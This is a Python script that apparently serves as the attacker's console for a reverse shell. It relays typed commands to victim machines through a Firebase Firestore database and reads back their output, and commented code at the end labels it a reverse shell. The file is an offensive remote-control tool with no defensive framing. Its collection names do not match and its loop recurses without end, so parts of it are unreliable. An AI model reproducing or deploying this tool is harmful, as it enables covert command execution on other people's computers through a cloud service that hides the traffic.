import subprocess
import time
import firebase_admin
from firebase_admin import credentials
from firebase_admin import firestore


class Attacker:
    def __init__(self):
        self.cred = credentials.Certificate("serviceAccountKey.json")
        firebase_admin.initialize_app(self.cred)
        self.db = firestore.client()

    def sendData(self):
        cmd = input("(Cible):> ")
        self.db.collection("cible").document(
            "command").set({"request": f"{cmd}"})

    def recvData(self):
        cmd = self.db.collection("target").document(
            "result").get()
        result = cmd.to_dict()
        return f"{result['response']}"

    def main(self):
        print(self.recvData())
        self.sendData()
        time.sleep(5)
        self.main()


Attacker().main()
# if msg[:2] == 'cd':
#     os.chdir(msg[3:])
#     self.send_msg("[REVERSE SHELL] * Changed Dir *")
# elif msg[:4] == 'exit':
#     self.fire_init()
# else:
#     self.send_msg(result)
